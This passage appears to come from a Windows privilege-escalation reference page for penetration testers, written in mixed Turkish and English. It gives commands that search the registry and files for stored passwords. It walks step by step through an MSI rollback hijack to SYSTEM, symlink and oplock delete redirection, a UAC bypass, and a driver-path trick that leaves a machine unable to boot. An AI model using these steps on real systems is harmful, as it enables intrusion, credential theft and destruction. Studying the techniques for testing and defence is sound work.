Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Geri Dönüşüm Kutusundaki Kimlik Bilgileri

İçinde kimlik bilgileri olup olmadığını görmek için Geri Dönüşüm Kutusunu da kontrol etmelisiniz

Çeşitli programlar tarafından kaydedilmiş **şifreleri kurtarmak** için şu adresi kullanabilirsiniz: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Kayıt Defteri İçinde

**Kimlik bilgisi içerebilecek diğer kayıt anahtarları**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Registry'den openssh anahtarlarını çıkarın.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Tarayıcı Geçmişi

Parolaların **Chrome veya Firefox**'tan saklandığı veritabanlarını kontrol etmelisiniz.  
Ayrıca tarayıcıların geçmişini, yer imlerini ve favorilerini kontrol edin; belki bazı **parolalar** orada saklanmıştır.

Tarayıcılardan parola çıkarmak için araçlar:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

Component Object Model (COM), farklı dillerde yazılmış yazılım bileşenleri arasında iletişim sağlayan Windows işletim sistemi içi bir teknolojidir. Her COM bileşeni bir class ID (CLSID) ile tanımlanır ve her bileşen işlevselliğini bir veya daha fazla arayüz aracılığıyla sunar; bu arayüzler interface ID'leri (IIDs) ile tanımlanır.

COM sınıfları ve arayüzleri registry'de sırasıyla **HKEY\CLASSES\ROOT\CLSID** ve **HKEY\CLASSES\ROOT\Interface** altında tanımlanır. Bu registry, **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** birleştirilerek oluşturulur = **HKEY\CLASSES\ROOT.**

Bu registry'nin CLSID'leri içinde çocuk registry **InProcServer32**'yi bulabilirsiniz; burada **default value** bir **DLL**'e işaret eder ve **ThreadingModel** adlı bir değer bulunur; bu değer **Apartment** (Tek iş parçacıklı), **Free** (Çok iş parçacıklı), **Both** (Tek veya Çok) veya **Neutral** (İş parçacığı nötr) olabilir.

![](<../../images/image (729).png>)

Temelde, çalıştırılacak DLL'lerden herhangi birinin üzerine yazabilirseniz, o DLL farklı bir kullanıcı tarafından çalıştırılacaksa yetki yükseltebilirsiniz.

Saldırganların COM Hijacking'i persistence mekanizması olarak nasıl kullandığını öğrenmek için bakın:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Dosyalarda ve registry'de Genel Parola araması**

**Dosya içeriklerini ara**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Belirli bir dosya adına sahip dosyayı ara**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Kayıt Defteri'nde anahtar adları ve parolalar için ara**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Passwords arayan araçlar

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** eklentisidir; bu eklentiyi hedefin içinde credentials arayan tüm metasploit POST module'larını otomatik olarak çalıştırmak için oluşturdum.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) bu sayfada bahsedilen password içeren tüm dosyaları otomatik olarak arar.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) bir sistemden password çıkarmak için başka harika bir araçtır.

Araç [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) açık metin olarak bu verileri kaydeden (PuTTY, WinSCP, FileZilla, SuperPuTTY ve RDP) çeşitli uygulamalarda bulunan **sessions**, **usernames** ve **passwords**'ları arar.
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Imagine that **a process running as SYSTEM open a new process** (`OpenProcess()`) with **full access**. The same process **also create a new process** (`CreateProcess()`) **with low privileges but inheriting all the open handles of the main process**.\
Then, if you have **full access to the low privileged process**, you can grab the **open handle to the privileged process created** with `OpenProcess()` and **inject a shellcode**.\
[Read this example for more information about **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)\
[Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Paylaşılan bellek segmentleri, **pipes** olarak adlandırılan, processler arası iletişim ve veri aktarımını sağlar.

Windows, **Named Pipes** adlı bir özellik sunar; bu, ilgisiz processlerin (hatta farklı ağlar üzerinde olanların) veri paylaşmasına izin verir. Bu, bir client/server mimarisine benzer; roller **named pipe server** ve **named pipe client** olarak tanımlanır.

Bir **client** pipe üzerinden veri gönderdiğinde, pipe'ı kuran **server**, gerekli **SeImpersonate** haklarına sahipse **client'ın kimliğini üstlenebilir**. Pipe üzerinden iletişim kuran ve taklit edebileceğiniz bir **privileged process** tespit etmek, sizin oluşturduğunuz pipe ile etkileşime girdiğinde o process'in kimliğini üstlenerek **daha yüksek ayrıcalıklar elde etme** fırsatı sağlar. Böyle bir saldırının nasıl gerçekleştirileceğine dair rehberler [**here**](named-pipe-client-impersonation.md) ve [**here**](#from-high-integrity-to-system) adreslerinde bulunabilir.

Ayrıca aşağıdaki araç, burp gibi bir araçla **named pipe iletişimini intercept etmenize olanak tanır:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **ve bu araç tüm pipe'ları listeleyip görerek privesc'leri bulmaya olanak tanır:** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Server modundaki Telephony servisi (TapiSrv) `\\pipe\\tapsrv` (MS-TRP) yolunu açığa çıkarır. Uzak authenticated bir client, mailslot tabanlı async event yolunu suistimal ederek `ClientAttach`'i `NETWORK SERVICE` tarafından yazılabilir herhangi bir mevcut dosyaya rastgele bir **4-byte write**'e dönüştürebilir, ardından Telephony admin hakları elde edip servisin parçası olarak rastgele bir DLL yükleyebilir. Tam akış:

- `ClientAttach` with `pszDomainUser` set to a writable existing path → the service opens it via `CreateFileW(..., OPEN_EXISTING)` and uses it for async event writes.
- Each event writes the attacker-controlled `InitContext` from `Initialize` to that handle. Register a line app with `LRegisterRequestRecipient` (`Req_Func 61`), trigger `TRequestMakeCall` (`Req_Func 121`), fetch via `GetAsyncEvents` (`Req_Func 0`), then unregister/shutdown to repeat deterministic writes.
- Add yourself to `[TapiAdministrators]` in `C:\Windows\TAPI\tsec.ini`, reconnect, then call `GetUIDllName` with an arbitrary DLL path to execute `TSPI_providerUIIdentify` as `NETWORK SERVICE`.

More details:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Çeşitli

### Windows'ta kod çalıştırabilecek dosya uzantıları

Bu sayfaya bakın **[https://filesec.io/](https://filesec.io/)**

### Protocol handler / ShellExecute abuse via Markdown renderers

Markdown'te tıklanabilir linklerin `ShellExecuteExW`'e iletilmesi, tehlikeli URI handler'larını (`file:`, `ms-appinstaller:` veya kayıtlı herhangi bir scheme) tetikleyebilir ve saldırgan kontrollü dosyaları mevcut kullanıcı olarak çalıştırabilir. Görün:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Parolalar için Komut Satırlarını İzleme**

Kullanıcı olarak bir shell elde ettiğinizde, komut satırında **kimlik bilgisi geçen** scheduled task'ler veya diğer process'ler çalışıyor olabilir. Aşağıdaki script, process komut satırlarını her iki saniyede bir yakalar ve mevcut durumu önceki durumla karşılaştırarak herhangi bir farkı çıktı olarak verir.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Stealing passwords from processes

## From Low Priv User to NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

If you have access to the graphical interface (via console or RDP) and UAC is enabled, in some versions of Microsoft Windows it's possible to run a terminal or any other process such as "NT\AUTHORITY SYSTEM" from an unprivileged user.

This makes it possible to escalate privileges and bypass UAC at the same time with the same vulnerability. Additionally, there is no need to install anything and the binary used during the process, is signed and issued by Microsoft.

Some of the affected systems are the following:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Bu zafiyeti istismar etmek için aşağıdaki adımları gerçekleştirmeniz gerekir:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
You have all the necessary files and information in the following GitHub repository:

https://github.com/jas502n/CVE-2019-1388

## From Administrator Medium to High Integrity Level / UAC Bypass

Read this to **learn about Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Then **read this to learn about UAC and UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP

Bu teknik [**in this blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) ile açıklanmış ve exploit kodu [**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs) üzerinde mevcuttur.

Saldırı temelde Windows Installer'ın rollback (geri alma) özelliğini, uninstall sürecinde meşru dosyaları kötü amaçlı olanlarla değiştirmek için kötüye kullanmak üzerine kuruludur. Bunun için saldırganın, `C:\Config.Msi` klasörünü kaçırmak amacıyla kullanılacak **kötü amaçlı bir MSI installer** oluşturması gerekir; Windows Installer daha sonra uninstall sırasında rollback dosyalarını depolamak için bu klasörü kullanacaktır ve rollback dosyaları kötü amaçlı payload içerecek şekilde değiştirilmiş olacaktır.

Özet teknik şu şekildedir:

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI
- Create an `.msi` that installs a harmless file (e.g., `dummy.txt`) in a writable folder (`TARGETDIR`).
- Mark the installer as **"UAC Compliant"**, so a **non-admin user** can run it.
- Keep a **handle** open to the file after install.

- Step 2: Begin Uninstall
- Uninstall the same `.msi`.
- The uninstall process starts moving files to `C:\Config.Msi` and renaming them to `.rbf` files (rollback backups).
- **Poll the open file handle** using `GetFinalPathNameByHandle` to detect when the file becomes `C:\Config.Msi\<random>.rbf`.

- Step 3: Custom Syncing
- The `.msi` includes a **custom uninstall action (`SyncOnRbfWritten`)** that:
- Signals when `.rbf` has been written.
- Then **waits** on another event before continuing the uninstall.

- Step 4: Block Deletion of `.rbf`
- When signaled, **open the `.rbf` file** without `FILE_SHARE_DELETE` — this **prevents it from being deleted**.
- Then **signal back** so the uninstall can finish.
- Windows Installer fails to delete the `.rbf`, and because it can’t delete all contents, **`C:\Config.Msi` is not removed**.

- Step 5: Manually Delete `.rbf`
- You (attacker) delete the `.rbf` file manually.
- Now **`C:\Config.Msi` is empty**, ready to be hijacked.

> At this point, **trigger the SYSTEM-level arbitrary folder delete vulnerability** to delete `C:\Config.Msi`.

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- Recreate the `C:\Config.Msi` folder yourself.
- Set **weak DACLs** (e.g., Everyone:F), and **keep a handle open** with `WRITE_DAC`.

- Step 7: Run Another Install
- Install the `.msi` again, with:
- `TARGETDIR`: Writable location.
- `ERROROUT`: A variable that triggers a forced failure.
- This install will be used to trigger **rollback** again, which reads `.rbs` and `.rbf`.

- Step 8: Monitor for `.rbs`
- Use `ReadDirectoryChangesW` to monitor `C:\Config.Msi` until a new `.rbs` appears.
- Capture its filename.

- Step 9: Sync Before Rollback
- The `.msi` contains a **custom install action (`SyncBeforeRollback`)** that:
- Signals an event when the `.rbs` is created.
- Then **waits** before continuing.

- Step 10: Reapply Weak ACL
- After receiving the `.rbs created` event:
- The Windows Installer **reapplies strong ACLs** to `C:\Config.Msi`.
- But since you still have a handle with `WRITE_DAC`, you can **reapply weak ACLs** again.

> ACLs are **only enforced on handle open**, so you can still write to the folder.

- Step 11: Drop Fake `.rbs` and `.rbf`
- Overwrite the `.rbs` file with a **fake rollback script** that tells Windows to:
- Restore your `.rbf` file (malicious DLL) into a **privileged location** (e.g., `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Drop your fake `.rbf` containing a **malicious SYSTEM-level payload DLL**.

- Step 12: Trigger the Rollback
- Signal the sync event so the installer resumes.
- A **type 19 custom action (`ErrorOut`)** is configured to **intentionally fail the install** at a known point.
- This causes **rollback to begin**.

- Step 13: SYSTEM Installs Your DLL
- Windows Installer:
- Reads your malicious `.rbs`.
- Copies your `.rbf` DLL into the target location.
- You now have your **malicious DLL in a SYSTEM-loaded path**.

- Final Step: Execute SYSTEM Code
- Run a trusted **auto-elevated binary** (e.g., `osk.exe`) that loads the DLL you hijacked.
- **Boom**: Your code is executed **as SYSTEM**.


### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

Ana MSI rollback tekniği (öncekiler), tüm bir klasörü (ör. `C:\Config.Msi`) silebildiğinizi varsayar. Peki ya açığınız sadece **arbitrary file deletion** izin veriyorsa?

NTFS iç yapısını kötüye kullanabilirsiniz: her klasörün gizli bir alternate data stream'i vardır, adı:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Bu stream klasörün **index metadata'sını** depolar.

Yani, eğer bir klasörün **`::$INDEX_ALLOCATION` stream'ini silerseniz**, NTFS **tüm klasörü kaldırır** dosya sisteminden.

Bunu şu gibi standart dosya silme API'lerini kullanarak yapabilirsiniz:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> *file* delete API'yi çağırıyor olsanız bile, bu **klasörün kendisini siler**.

### From Folder Contents Delete to SYSTEM EoP
Primitive'iniz rastgele dosya/klasör silmenize izin vermiyorsa, ancak **saldırgan kontrollü bir klasörün *içeriğinin* silinmesine izin veriyorsa**, ne olur?

1. Adım 1: Bir yem klasör ve dosya oluşturun
- Create: `C:\temp\folder1`
- Inside it: `C:\temp\folder1\file1.txt`

2. Adım 2: `file1.txt` üzerine bir **oplock** yerleştirin
- O oplock, ayrıcalıklı bir süreç `file1.txt`'ı silmeye çalıştığında yürütmeyi **duraklatır**.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Adım 3: SYSTEM sürecini tetikleyin (ör. `SilentCleanup`)
- Bu süreç klasörleri (ör. `%TEMP%`) tarar ve içindekileri silmeye çalışır.
- `file1.txt`'e ulaştığında, **oplock tetiklenir** ve kontrol callback'inize verilir.

4. Adım 4: oplock callback'inin içinde – silmeyi yönlendirin

- Seçenek A: `file1.txt`'i başka bir yere taşıyın
- Bu, oplock'u kırmadan `folder1`'i boşaltır.
- `file1.txt`'i doğrudan silmeyin — bu oplock'u erken serbest bırakır.

- Seçenek B: `folder1`'i bir **junction**'a dönüştürün:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Seçenek C: `\RPC Control` içinde bir **symlink** oluşturun:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Bu, klasör meta verisini depolayan NTFS iç akışını hedef alır — onu silmek klasörü siler.

5. Adım 5: oplock'u serbest bırak
- SYSTEM işlemi devam eder ve `file1.txt`'i silmeye çalışır.
- Ancak şimdi, junction + symlink nedeniyle, aslında şunu siliyor:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Sonuç**: `C:\Config.Msi` SYSTEM tarafından silinir.

### Arbitrary Folder Create'den Kalıcı DoS'a

Size **SYSTEM/admin olarak rastgele bir klasör oluşturma** imkânı veren bir primitive'i istismar edin — **dosya yazamıyor** veya **zayıf izinler ayarlayamıyor** olsanız bile.

Adı **kritik Windows sürücüsü** olan bir **klasör** (dosya değil) oluşturun, örn:
```
C:\Windows\System32\cng.sys
```
- Bu yol normalde `cng.sys` kernel-mode driver ile eşleşir.
- Eğer bunu **önceden bir klasör olarak oluşturursanız**, Windows gerçek sürücüyü boot sırasında yükleyemez.
- Sonra, Windows boot sırasında `cng.sys` yüklemeye çalışır.
- Klasörü görür, **gerçek sürücüyü çözemeyerek**, ve **çöker veya boot'u durdurur**.
- Harici müdahale olmadan (ör. boot repair veya disk erişimi) **geri dönüş mekanizması yok** ve **kurtarma yok**.

### From privileged log/backup paths + OM symlinks to arbitrary file overwrite / boot DoS

Bir **ayrıcalıklı servis** bir yolu okunan bir **yazılabilir config**e loglar/exports yazdığında, o yolu **Object Manager symlinks + NTFS mount points** ile yönlendirerek ayrıcalıklı yazmayı keyfi bir dosya üzerine yazma işlemine dönüştürebilirsiniz (üstelik **SeCreateSymbolicLinkPrivilege** olmadan bile).

**Gereksinimler**
- Hedef yolu saklayan config dosyası saldırgan tarafından yazılabilir olmalı (örn. `%ProgramData%\...\.ini`).
- `\RPC Control` için bir mount point ve bir OM file symlink oluşturabilme yeteneği (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
- O yola yazan ayrıcalıklı bir işlem (log, export, report).

**Örnek zincir**
1. Konfigürasyonu okuyarak ayrıcalıklı log hedefini bulun, örn. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` in `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Yolu admin olmadan yönlendirin:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Yetkili bileşenin günlüğü yazmasını bekleyin (ör. admin "send test SMS" tetikler). Yazma şimdi `C:\Windows\System32\cng.sys` konumuna yapılıyor.
4. Üzerine yazılan hedefi (hex/PE parser) bozulmayı doğrulamak için inceleyin; yeniden başlatma Windows'u değiştirilmiş driver yolunu yüklemeye zorlar → **boot loop DoS**. Bu ayrıca yetkili bir servisin yazma için açacağı herhangi bir korumalı dosyaya genelleştirilebilir.

> `cng.sys` is normally loaded from `C:\Windows\System32\drivers\cng.sys`, but if a copy exists in `C:\Windows\System32\cng.sys` it can be attempted first, making it a reliable DoS sink for corrupt data.



## **From High Integrity to System**

### **New service**

Eğer zaten High Integrity process üzerinde çalışıyorsanız, **path to SYSTEM** sadece **yeni bir servis oluşturup çalıştırmak** kadar kolay olabilir:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> service binary oluştururken, bunun geçerli bir service olduğundan veya binary'nin gerekli işlemleri yeterince hızlı gerçekleştirdiğinden emin olun; geçerli bir service değilse 20s içinde sonlandırılacaktır.

### AlwaysInstallElevated

High Integrity bir süreçten **AlwaysInstallElevated registry entries**'ı etkinleştirip bir _**.msi**_ wrapper kullanarak bir reverse shell **install** etmeyi deneyebilirsiniz.\
[More information about the registry keys involved and how to install a _.msi_ package here.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Şunu yapabilirsiniz** [**find the code here**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Eğer bu token ayrıcalıklarına sahipseniz (muhtemelen bunu zaten High Integrity bir süreçte bulacaksınız), SeDebug ayrıcalığı ile neredeyse herhangi bir process'i (korunmuş process'ler hariç) açabilir, process'in token'ını kopyalayabilir ve o token ile rastgele bir process oluşturabilirsiniz.\
Bu teknik genellikle tüm token ayrıcalıklarına sahip SYSTEM olarak çalışan herhangi bir process'in seçilmesiyle uygulanır (_evet, tüm token ayrıcalıklarına sahip olmayan SYSTEM process'leri de bulabilirsiniz_).\
**Bulabilirsiniz** [**example of code executing the proposed technique here**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Bu teknik meterpreter tarafından getsystem yükseltmesi için kullanılır. Teknik, **bir pipe oluşturup sonra bu pipe'a yazması için bir service oluşturmak/suistimal etmek** esasına dayanır. Ardından, pipe'ı `SeImpersonate` ayrıcalığıyla oluşturan **server**, pipe istemcisinin (service) token'ını **impersonate** ederek SYSTEM ayrıcalıkları elde edebilir.\
If you want to [**learn more about name pipes you should read this**](#named-pipe-client-impersonation).\
If you want to read an example of [**how to go from high integrity to System using name pipes you should read this**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Eğer SYSTEM olarak çalışan bir process tarafından yüklenen bir **dll'i hijack etmeyi** başarırsanız, bu izinlerle rastgele kod çalıştırabilirsiniz. Bu yüzden Dll Hijacking bu tür privilege escalation için faydalıdır ve ayrıca high integrity bir process'ten erişilmesi çok daha kolaydır; çünkü dll'lerin yüklendiği klasörlerde **write permissions** olacaktır.\
**Şunu yapabilirsiniz** [**learn more about Dll hijacking here**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Read:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Yanlış yapılandırmalar ve hassas dosyalar için kontrol et (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Tespit edildi.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Bazı olası yanlış yapılandırmaları kontrol et ve bilgi topla (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Yanlış yapılandırmalar için kontrol**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY, WinSCP, SuperPuTTY, FileZilla ve RDP kaydedilmiş oturum bilgilerini çıkarır. Localde -Thorough kullanın.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager'dan kimlik bilgilerini çıkarır. Tespit edildi.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Toplanmış parolaları domain genelinde spray etmek için**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh bir PowerShell ADIDNS/LLMNR/mDNS spoofer ve man-in-the-middle aracıdır.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Temel privesc Windows enumerasyonu**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~ -- Bilinen privesc zafiyetlerini ara (Watson yerine DEPRECATED)~~**\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Local kontroller **(Admin hakları gerekli)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Bilinen privesc zafiyetlerini ara (VisualStudio kullanılarak derlenmesi gerekir) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Ev sahibi üzerinde yanlış yapılandırmaları arayarak bilgi toplar (daha çok bilgi toplama aracı, privesc'ten çok) (derlenmesi gerekir) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Birçok yazılımdan kimlik bilgilerini çıkartır (github'da önceden derlenmiş exe var)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp'ın C# portu**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~ -- Yanlış yapılandırmaları kontrol et (github'da önceden derlenmiş executable). Tavsiye edilmez. Win10'da iyi çalışmıyor.~~**\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Olası yanlış yapılandırmaları kontrol et (python'dan exe). Tavsiye edilmez. Win10'da iyi çalışmıyor.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Bu gönderiye dayanılarak oluşturulmuş araç (accesschk olmadan da düzgün çalışması için tasarlandı ama kullanabilir).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** çıktısını okuyup çalışan exploit'leri önerir (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** çıktısını okuyup çalışan exploit'leri önerir (local python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Projeyi doğru .NET sürümü kullanarak derlemeniz gerekir ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Hedef makinede yüklü .NET sürümünü görmek için şunu yapabilirsiniz:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Referanslar

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
